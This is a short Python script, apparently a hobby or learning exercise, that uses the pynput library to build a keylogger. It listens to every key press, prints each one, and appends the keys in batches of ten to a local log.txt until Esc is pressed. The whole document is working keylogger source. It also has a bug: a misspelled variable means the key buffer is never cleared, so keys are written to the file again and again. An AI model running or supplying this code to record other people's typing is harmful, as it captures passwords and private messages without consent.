#Install pynput
import os
from pynput.keyboard import Key, Listener

count = 0
keyList = []

# Reference https://pypi.org/project/pynput/
def on_press(key):
    global keyList, count
    try:
        print('alphanumeric key {0} pressed'.format(key.char))
    except AttributeError:
        print('special key {0} pressed'.format(key))

    keyList.append(key)
    count += 1

    #Every 10 character will put into the file
    if count >= 10:
        count = 0
        writeFile(keyList)
        keylist = []


def on_release(key):
    if key == Key.esc:
        # Stop listener
        return False

def writeFile(keyList):
    with open("log.txt", "a" if os.path.exists("log.txt") else "w") as logfile:
        for key in keyList:
            logfile.write(str(key))


with Listener(on_press = on_press ,on_release = on_release) as listener:
    listener.join()